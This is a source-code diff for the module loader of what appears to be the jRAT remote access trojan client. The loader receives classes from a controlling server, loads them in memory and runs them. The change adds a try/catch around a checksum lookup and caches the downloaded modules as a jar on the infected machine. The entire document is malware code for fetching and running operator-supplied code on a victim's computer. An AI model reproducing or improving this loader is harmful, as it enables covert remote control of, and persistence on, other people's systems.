@@ -8,7 +8,10 @@ import jrat.common.Logger;
 import jrat.common.compress.QuickLZ;
 import jrat.common.codec.Hex;
 
+import java.io.ByteArrayOutputStream;
 import java.util.Arrays;
+import java.util.jar.JarOutputStream;
+import java.util.zip.ZipEntry;
 
 public class ModuleLoader {
 
@@ -29,7 +32,13 @@ public class ModuleLoader {
 
             Main.debug("receiving module " + mainClass + " (" + Hex.encode(sum) + ")");
 
-            byte[] localSum = CachedModuleLookup.lookupSum(mainClass);
+            byte[] localSum = new byte[0];
+
+            try {
+                localSum = CachedModuleLookup.lookupSum(mainClass);
+            } catch (Exception ex) {
+                ex.printStackTrace();
+            }
 
             boolean valid = Arrays.equals(sum, localSum);
 
@@ -45,6 +54,9 @@ public class ModuleLoader {
             }
 
             MemoryClassLoader l = new MemoryClassLoader(ModuleLoader.class.getClassLoader(), null);
+
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            JarOutputStream jar = new JarOutputStream(baos);
 
             // read all classes and resources from the server
             while (c.readBoolean()) {
@@ -63,8 +75,15 @@ public class ModuleLoader {
                     l.addResource(name, buffer);
                 }
 
+                jar.putNextEntry(new ZipEntry(name));
+                jar.write(buffer);
+                jar.closeEntry();
+
                 Main.debug("\tclass " + name + " (" + classLen + " b)");
             }
+
+            jar.close();
+            CachedModule.store(mainClass, baos.toByteArray());
 
             // load the main class
             Class<ClientModule> clazz = (Class<ClientModule>) l.loadClass(mainClass);
